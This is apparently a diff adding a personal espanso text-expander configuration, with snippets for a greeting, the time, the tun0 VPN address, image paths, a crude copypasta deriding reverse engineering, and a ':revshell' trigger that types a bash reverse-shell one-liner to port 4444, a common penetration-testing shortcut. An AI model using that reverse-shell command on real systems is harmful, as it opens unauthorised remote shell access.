@@ -1,0 +1,47 @@
+# it gets replaced by the "replace" string.
+global_vars:
+  - name: tun0
+    type: shell
+    params:
+      cmd: "ip addr show tun0 | grep -oP 'inet \\K[\\d.]+'"
+
+matches:
+  # Simple text replacement
+  - trigger: ":espanso"
+    replace: "Hi there!"
+
+  - trigger: ":now"
+    replace: "It's {{mytime}}"
+    vars:
+      - name: mytime
+        type: date
+        params:
+          format: "%H:%M"
+
+  - trigger: ":tun0"
+    replace: "{{tun0}}"
+
+  - trigger: ":revshell"
+    replace: "bash -c 'bash -i >& /dev/tcp/{{tun0}}/4444 0>&1'"
+
+  - trigger: ":reversing"
+    replace: "    reverse engineering is fundamentally a cuck activity. allow me to explain.
+
+    someone else had amazing tools at their disposal that exist to serve their creativity: they had a blank slate, compilers, assemblers, paint programs, composing software, and they used it to whatever ends their creativity sough towards to create something of their own mind's volition. it is fundamentally a spiritual agent of the creator that represents them and their ideas.
+
+    then the reverse engineer comes along, and takes this creation, and submits himself totally to the other man's work. to reverse engineer a binary, is to put all your intellectual and creative potential, and shoehorn your own free spirit into not even the mould, but a duplicate of a mould of someone else's free spirit.
+
+    youre literally dedicating your own intellectual creative resources to essentially worship another man's work. the time granted to you, which is intended to be your opportunity to express yourself, you use to walk in someone else's footprints.
+
+    seriously, reverse engineering is actually disgusting, especially reverse engineering old games. why don't you download Borland-C and write your own games? why crack game security, when you can write software, and make so much money from your creative job of software creation, that spending $50 becomes literal pocket change?"
+  - trigger: ":dope"
+    image_path: "/home/zeeshan/Downloads/dope.jpg"
+
+  - trigger: ":loved"
+    image_path: "/home/zeeshan/Downloads/loved.jpg"
+
+  - trigger: ":dontcare"
+    replace: "https://clips.twitch.tv/CaringPolishedHamsterSMOrc-oFxW_Mrht0iuLfbF"
+
+  - trigger: ":thanksanyway"
+    image_path: "/home/zeeshan/Downloads/thanksanyway.gif"
